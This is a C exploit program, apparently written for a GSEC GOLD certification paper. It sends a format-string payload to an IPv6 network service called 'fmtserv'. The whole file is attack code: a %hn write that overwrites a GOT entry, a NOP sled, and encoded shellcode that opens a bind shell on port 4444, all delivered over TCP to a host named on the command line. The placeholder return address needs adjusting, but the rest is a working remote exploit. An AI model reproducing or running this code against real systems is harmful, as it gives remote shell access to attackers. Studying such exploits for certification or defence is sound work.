/*
Written for GSEC GOLD certification by Atik Pilihanto | datacomm.co.id
This code is modified from Joonbok Lee presentation on IPv6 Socket Programming
Save as dummy-fms6.c
*/
#include <stdio.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <string.h>
#include <stdlib.h>
#define GOTADDR 0x08049a94//snprintf() => objdump -R fmtserv
#define RETADDR 0x41414141
#define OFFSET 4
#define SIZE 1024

char shellcode[] = /*Portbind @ 4444*/
"\xd9\xcc\xbd\x59\x34\x55\x97\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x17\x31\x6a\x19\x83\xc2\x04\x03\x6a\x15\xbb\xc1\x64"
"\x4c\x68\x69\xd4\x18\x84\xe4\x3b\xb6\xfe\xae\x76\xc7\x68"
"\xd7\xdb\x9a\xc6\xba\x89\x48\x80\x52\x3f\x31\x2a\xcb\x35"
"\xc9\x3b\xea\x20\xd5\x6a\xbb\x3d\x04\xcf\x29\x58\x9f\x02"
"\x2d\x14\x79\x2f\x2a\x98\x06\x1d\x61\x74\x8e\x40\xc6\xc8"
"\xf6\x4f\x49\xbb\xae\x25\x75\xe4\x9d\x39\xc0\x6d\xe6\x51"
"\xfc\xa2\x65\xc9\x6a\x92\xeb\x60\x05\x65\x08\x22\x8a\xfc"
"\x2e\x72\x27\x32\x30";

int main(int argc, char *argv[])
{
	if(argc < 3) {
		printf("Usage: %s <Host/IPv6><port>\n", argv[0]);
		return 0;
	}
	char buffer[SIZE], *got[3] = {((char *)GOTADDR + 2),((char *)GOTADDR), 0};
	memset(buffer, 0, SIZE);
	int high, low, len, s, retval;
	struct addrinfo Hints, *AddrInfo, *AI;

	
	printf("<%x>, expected 0x4141\n", RETADDR);
	high = (RETADDR & 0xffff0000) >> 16;
	low = (RETADDR & 0x0000ffff);
	printf("high before -= <%x>, expected 4141\n", high);
	printf("low is <%x>, expected 4141\n", low);
	high -= 0x8;
	printf("high after -= %x\n", high);
	printf("low - high - 0x8, <%x>\n", (low - high) - 8);
	sprintf(buffer, "%s%%.%dx%%%d$hn%%.%dx%%%d$hn", &got, high, OFFSET,(low - high) - 0x8, OFFSET + 1);
	
	printf("%d strlen(buffer)\n", strlen(buffer));
	printf("%s\n", buffer);
	printf("%d shellcode, expected 117\n", strlen(shellcode));
	
	memset(buffer + strlen(buffer), '\x90', 512);
	
	printf("%d strlen(buffer) before shellcode\n", strlen(buffer));
	
	sprintf(buffer + strlen(buffer), "%s\r\n", shellcode);
	
	printf("%d strlen(buffer) after shellcode\n", strlen(buffer));
	len = strlen(buffer);
	memset(&Hints,0,sizeof(Hints));
	
	
	Hints.ai_family = AF_UNSPEC;
	Hints.ai_socktype = SOCK_STREAM;
	retval = getaddrinfo(argv[1],argv[2], &Hints, &AddrInfo);
	if(retval!=0){
		printf("Cannot resolve requested address\n");
		exit(0);
	}
	int i;
	for(i = 0; i < 2; i++)
	{
		for(AI = AddrInfo; AI != NULL; AI = AI->ai_next)
		{
			if((s = socket(AI->ai_family,AI->ai_socktype,AI->ai_protocol)) < 0)
			{
				printf("can't create socket\n");
				exit(0);
			}
			connect(s,AI->ai_addr,AI->ai_addrlen);
			send(s,buffer,len,0);
			printf("SENT [OK]\n");
		}
	}
	freeaddrinfo(AddrInfo);
	return 0;
}